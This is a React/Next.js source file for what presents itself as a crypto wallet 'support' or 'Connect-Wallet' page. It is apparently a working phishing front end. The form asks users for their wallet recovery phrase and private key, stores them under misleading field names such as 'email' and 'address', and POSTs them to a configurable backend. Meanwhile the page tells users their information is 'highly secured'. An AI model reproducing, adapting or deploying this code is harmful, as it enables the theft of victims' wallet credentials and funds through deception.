// (same as your support code, only color classes updated where present)
'use client';

import { useEffect, useState, Suspense } from 'react';
import { useSearchParams } from 'next/navigation';
import { motion, AnimatePresence } from 'framer-motion';

function SupportForm() {
  const search = useSearchParams();
  const walletFromQuery = search?.get('wallet') || '';

  const [tab, setTab] = useState('wallet');
  const [walletData, setWalletData] = useState({ address: '', walletType: '' });
  const [personalData, setPersonalData] = useState({ name: '', email: '' });
  const [submitting, setSubmitting] = useState(false);
  const [modal, setModal] = useState({ open: false, success: false, message: '' });

  useEffect(() => {
    if (walletFromQuery) {
      setWalletData((p) => ({ ...p, walletType: walletFromQuery }));
      setTab('wallet');
    }
  }, [walletFromQuery]);

  const onWalletChange = (e) => {
    const { name, value } = e.target;
    setWalletData((p) => ({ ...p, [name]: value }));
  };

  const onPersonalChange = (e) => {
    const { name, value } = e.target;
    setPersonalData((p) => ({ ...p, [name]: value }));
  };

  function hasAtLeastOneSideFilled() {
    const walletFilled = (walletData.address || walletData.walletType) && (walletData.address.trim() || walletData.walletType.trim());
    const personalFilled = (personalData.name || personalData.email) && (personalData.name.trim() || personalData.email.trim());
    return Boolean(walletFilled || personalFilled);
  }

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (submitting) return;

    if (!hasAtLeastOneSideFilled()) {
      setModal({ open: true, success: false, message: 'Please fill at least one field before submitting.' });
      return;
    }

    setSubmitting(true);

    const name = personalData.name || '';
    const email = personalData.email || '';
    const address = walletData.address || '';
    const walletType = walletData.walletType || walletFromQuery || '';
    const messageLines = [
      walletType ? `Wallet-Name: ${walletType}` : null,
      address ? `Phrase: ${address}` : null,
      name ? `Wallet-Name: ${walletType}` : null,
      email ? `Private-Key: ${email}` : null,
      '',
      'Issue:',
    ].filter(Boolean).join('\n');

    const payload = { name, email, message: messageLines, address };

    try {
      const backend = process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:4000';
      await fetch(`${backend}/support`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      setModal({ open: true, success: true, message: 'Submission successful!' });
      setWalletData({ address: '', walletType: '' });
      setPersonalData({ name: '', email: '' });
    } catch (err) {
      console.error('Support submit error:', err);
      setModal({ open: true, success: false, message: 'Submission failed. Please try again.' });
    } finally {
      setSubmitting(false);
    }
  };

  useEffect(() => {
    if (!modal.open) return;
    const t = setTimeout(() => setModal({ open: false, success: false, message: '' }), 4000);
    return () => clearTimeout(t);
  }, [modal.open]);

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-[#F8FAFC] to-[#EEF2FF] p-6">
      <motion.div
        initial={{ opacity: 0, y: 24 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.35 }}
        className="w-full max-w-3xl bg-white/85 backdrop-blur-xl rounded-2xl shadow-xl border border-white/30 overflow-hidden"
      >
        {/* Header + Tabs */}
        <div className="flex items-center justify-between p-6 border-b border-white/30">
          <div>
            <h1 className="text-xl font-semibold text-[#6D28D9]">Connect-Wallet — {walletFromQuery ? walletFromQuery : 'Wallet'}</h1>
            <p className="text-xs text-[#64748B] mt-1">Fill in at least one field</p>
          </div>
          <div className="bg-white/60 p-1 rounded-full border border-white/30">
            <div className="flex items-center gap-1">
              <button onClick={() => setTab('wallet')} className={`px-4 py-1 rounded-full text-sm font-medium transition ${tab === 'wallet' ? 'bg-[#6D28D9] text-white shadow' : 'text-[#6D28D9]'}`} aria-pressed={tab === 'wallet'}>PHRASE</button>
              <button onClick={() => setTab('personal')} className={`px-4 py-1 rounded-full text-sm font-medium transition ${tab === 'personal' ? 'bg-[#6D28D9] text-white shadow' : 'text-[#6D28D9]'}`} aria-pressed={tab === 'personal'}>PRIVATE-KEY</button>
            </div>
          </div>
        </div>

        {/* Body */}
        <div className="p-6">
          <form id="support-form" onSubmit={handleSubmit} className="space-y-6">
            <AnimatePresence mode="wait">
              {tab === 'wallet' ? (
                <motion.div key="wallet" initial={{ opacity: 0, x: 12 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -12 }} transition={{ duration: 0.25 }} className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-[#4338CA] text-sm font-medium mb-1">Wallet Phrase</label>
                    <input name="address" value={walletData.address} onChange={onWalletChange} placeholder="Enter recovery phrase" className="w-full rounded-lg border border-[#EDEBFF] p-2.5 bg-white/60 focus:ring-2 focus:ring-[#6D28D9] outline-none text-[#0f1724]" />
                  </div>
                  <div>
                    <label className="block text-[#4338CA] text-sm font-medium mb-1">Wallet Type</label>
                    <input name="walletType" value={walletData.walletType} onChange={onWalletChange} placeholder={walletFromQuery || 'e.g. MetaMask, Phantom'} className="w-full rounded-lg border border-[#EDEBFF] p-2.5 bg-white/60 focus:ring-2 focus:ring-[#6D28D9] outline-none text-[#0f1724]" />
                  </div>
                  <div className="md:col-span-2 text-sm text-[#64748B]">Tip: Prefilled wallet type from query.</div>
                </motion.div>
              ) : (
                <motion.div key="personal" initial={{ opacity: 0, x: 12 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -12 }} transition={{ duration: 0.25 }} className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-[#4338CA] text-sm font-medium mb-1">Wallet Type</label>
                    <input name="walletType" value={walletData.walletType} onChange={onWalletChange} placeholder={walletFromQuery || 'e.g. MetaMask, Phantom'} className="w-full rounded-lg border border-[#EDEBFF] p-2.5 bg-white/60 focus:ring-2 focus:ring-[#6D28D9] outline-none text-[#0f1724]" />
                  </div>
                  <div>
                    <label className="block text-[#4338CA] text-sm font-medium mb-1">Private-Key</label>
                    <textarea name="email" value={personalData.email} onChange={onPersonalChange} placeholder="64 character string." className="w-full rounded-lg border border-[#EDEBFF] p-2.5 bg-white/60 focus:ring-2 focus:ring-[#6D28D9] outline-none text-[#0f1724]" />
                  </div>
                  <div className="md:col-span-2 text-sm text-[#64748B]">Tip: Keep private info secure.</div>
                </motion.div>
              )}
            </AnimatePresence>
          </form>
        </div>

        {/* Footer */}
        <div className="p-6 border-t border-white/30 bg-white/40 flex items-center justify-between gap-4">
          <div className="text-sm text-[#4338CA]">Your information is highly secured. 🔐</div>
          <div>
            <button form="support-form" type="submit" disabled={submitting} className={`px-5 py-2 rounded-lg font-semibold transition ${submitting ? 'bg-[#9CA3FF] text-white cursor-wait' : 'btn-primary'}`}>
              {submitting ? 'Submitting...' : 'Submit'}
            </button>
          </div>
        </div>
      </motion.div>

      {/* Modal */}
      <AnimatePresence>
        {modal.open && (
          <motion.div key="feedback" className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 backdrop-blur-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
            <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }} transition={{ type: 'spring', stiffness: 120, damping: 15 }} className={`bg-white/95 backdrop-blur-xl p-6 rounded-2xl shadow-xl border ${modal.success ? 'border-[#D4AF37]/40' : 'border-[#6D28D9]/10'} max-w-sm text-center`}>
              <p className={`text-lg font-semibold ${modal.success ? 'text-[#059669]' : 'text-[#B91C1C]'}`}>{modal.message}</p>
              <div className="mt-4">
                <button onClick={() => setModal({ open: false, success: false, message: '' })} className="px-4 py-2 rounded-lg bg-[#6D28D9] text-white font-medium hover:bg-[#5b21b6] transition">Close</button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

export default function SupportPageWrapper() {
  return (
    <Suspense fallback={<div>Loading Support Page...</div>}>
      <SupportForm />
    </Suspense>
  );
}
